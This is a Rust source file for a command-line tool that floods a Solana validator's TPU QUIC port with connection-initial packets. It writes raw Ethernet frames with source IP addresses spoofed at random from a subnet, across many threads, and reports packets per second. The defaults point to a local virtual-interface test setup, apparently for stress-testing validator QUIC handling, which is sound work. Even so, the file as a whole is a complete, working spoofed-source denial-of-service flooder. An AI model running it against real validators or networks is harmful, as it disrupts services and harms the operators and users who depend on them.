use {
    clap_v4::{self as clap, Parser},
    pnet::{
        datalink::{self, Channel::Ethernet, Config, NetworkInterface},
        ipnetwork::Ipv4Network,
        packet::{
            ethernet::{EtherTypes, MutableEthernetPacket},
            ip::IpNextHeaderProtocols,
            ipv4::MutableIpv4Packet,
            udp::{ipv4_checksum_adv, MutableUdpPacket},
        },
        util::MacAddr,
    },
    quinn::{
        crypto::rustls::QuicClientConfig, ClientConfig, EndpointConfig, IdleTimeout,
        TransportConfig,
    },
    rand::Rng,
    solana_keypair::Keypair,
    solana_streamer::nonblocking::quic::ALPN_TPU_PROTOCOL_ID,
    solana_tls_utils::{new_dummy_x509_certificate, tls_client_config_builder},
    std::{
        net::{IpAddr, Ipv4Addr, SocketAddr, SocketAddrV4},
        sync::{
            atomic::{AtomicUsize, Ordering},
            Arc,
        },
        thread,
        time::{Duration, Instant},
    },
};

#[derive(clap::Parser, Clone)]
#[command(version, about, long_about = None)]
struct Cli {
    #[arg(short, long)]
    /// Target TPU address. Remember to use the QUIC address without offset!
    target: SocketAddrV4,
    #[arg(short, long)]
    /// Target's Ethernet address. This tool is dumb and does not do ARP.
    mac: MacAddr,
    /// Interface from which to flood.
    #[arg(short, long, default_value = "veth1")]
    interface: String,
    #[arg(short, long, default_value = "10.11.0.0/16")]
    /// Subnet for the source addresses.
    source: Ipv4Network,
    #[arg(short, long, default_value_t = 16)]
    /// Number of flood threads to spawn.
    num_threads: usize,
}

fn main() {
    let cli = Cli::parse();
    let counter = AtomicUsize::new(0);
    std::thread::scope(|scope| {
        for _ in 0..cli.num_threads {
            scope.spawn(|| worker(&cli, &counter));
        }
        scope.spawn(|| monitor(&counter));
    });
}

#[allow(clippy::arithmetic_side_effects)]
fn worker(cli: &Cli, counter: &AtomicUsize) -> ! {
    let keypair = Keypair::new();
    let client_config = get_client_config(&keypair);
    let endpoint_config = EndpointConfig::default();
    let mut endpoint = quinn_proto::Endpoint::new(Arc::new(endpoint_config), None, true, None);

    let dst_ip = *cli.target.ip();
    let dst_port = cli.target.port();
    let interface_names_match = |iface: &NetworkInterface| iface.name == cli.interface;

    // Find the network interface with the provided name
    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(interface_names_match)
        .expect("Specified interface not found!");

    // Create a new channel, dealing with layer 2 packets
    let (mut tx, _rx) = match datalink::channel(&interface, Config::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("An error occurred when creating the datalink channel: {e}",),
    };

    let mut rng = rand::thread_rng();

    let mut packet_buffer = [0u8; 1500];
    let mut quic_payload_buffer = Vec::with_capacity(1500);

    loop {
        counter.fetch_add(1, Ordering::Relaxed);

        let src_port: u16 = rng.gen_range(1024..65534);
        let src_ip: u32 = rng.r#gen();
        let src_ip = cli.source.ip().to_bits() | (src_ip & (!cli.source.mask().to_bits()));
        let src_ip = Ipv4Addr::from_bits(src_ip);

        // Create new connection
        let peer = SocketAddr::new(IpAddr::V4(dst_ip), dst_port);
        let (_connection_handle, mut connection) = endpoint
            .connect(Instant::now(), client_config.clone(), peer, "connect")
            .unwrap();

        // Split buffer into parts
        let (eth_buf, rest) = packet_buffer.split_at_mut(14);
        let (ip_buf, rest) = rest.split_at_mut(20);
        let (udp_buf, payload_buf) = rest.split_at_mut(8);

        // === Build QUIC header ===
        let txmit = connection
            .poll_transmit(Instant::now(), 512, &mut quic_payload_buffer)
            .unwrap();
        assert!(
            txmit.size <= payload_buf.len(),
            "`poll_transmit()` produced an unexpectedly large packet payload:\nAllocated space: \
             {}\nProduced packet size: {}",
            payload_buf.len(),
            txmit.size,
        );
        let payload_len = txmit.size;
        payload_buf[0..payload_len].copy_from_slice(&quic_payload_buffer);
        quic_payload_buffer.clear();

        let total_len = 14 + 20 + 8 + payload_len;
        // === Build UDP header ===
        let mut udp_packet = MutableUdpPacket::new(udp_buf).unwrap();
        udp_packet.set_source(src_port); // source port
        udp_packet.set_destination(dst_port); // dest port
        udp_packet.set_length((8 + payload_len) as u16);

        let checksum = ipv4_checksum_adv(
            &udp_packet.to_immutable(),
            &payload_buf[0..payload_len],
            &src_ip,
            &dst_ip,
        );
        udp_packet.set_checksum(checksum);

        // === Build IPv4 header ===
        let mut ip_packet = MutableIpv4Packet::new(ip_buf).unwrap();
        ip_packet.set_version(4);
        ip_packet.set_header_length(5);
        ip_packet.set_total_length(20 + udp_packet.get_length());
        ip_packet.set_ttl(64);
        ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Udp);
        ip_packet.set_source(src_ip);
        ip_packet.set_destination(dst_ip);

        // Compute IPv4 checksum
        let checksum = pnet::packet::ipv4::checksum(&ip_packet.to_immutable());
        ip_packet.set_checksum(checksum);

        // === Build Eth header ===
        let mut packet = MutableEthernetPacket::new(eth_buf).unwrap();
        packet.set_destination(cli.mac);
        packet.set_source(interface.mac.unwrap()); // your MAC
        packet.set_ethertype(EtherTypes::Ipv4); // or custom type

        // === Send the whole packet ===
        tx.send_to(&packet_buffer[0..total_len], None)
            .unwrap()
            .unwrap();
    }
}

fn monitor(counter: &AtomicUsize) {
    loop {
        let t0 = Instant::now();
        thread::sleep(Duration::from_secs(1));
        let n = counter.swap(0, Ordering::Relaxed);
        println!(
            "Sent {n} pacekts in {:?}, {} pps",
            t0.elapsed(),
            n as f32 / t0.elapsed().as_secs_f32()
        );
    }
}

pub fn get_client_config(keypair: &Keypair) -> ClientConfig {
    pub const QUIC_MAX_TIMEOUT: Duration = Duration::from_secs(60);
    pub const QUIC_KEEP_ALIVE: Duration = Duration::from_secs(45);
    pub const QUIC_SEND_FAIRNESS: bool = false;
    let (cert, key) = new_dummy_x509_certificate(keypair);
    let mut crypto = tls_client_config_builder()
        .with_client_auth_cert(vec![cert], key)
        .expect("Failed to use client certificate");
    crypto.enable_early_data = true;
    crypto.alpn_protocols = vec![ALPN_TPU_PROTOCOL_ID.to_vec()];
    let mut config = ClientConfig::new(Arc::new(QuicClientConfig::try_from(crypto).unwrap()));
    let mut transport_config = TransportConfig::default();
    let timeout = IdleTimeout::try_from(QUIC_MAX_TIMEOUT).unwrap();
    transport_config.max_idle_timeout(Some(timeout));
    transport_config.keep_alive_interval(Some(QUIC_KEEP_ALIVE));
    transport_config.send_fairness(QUIC_SEND_FAIRNESS);
    config.transport_config(Arc::new(transport_config));
    config
}
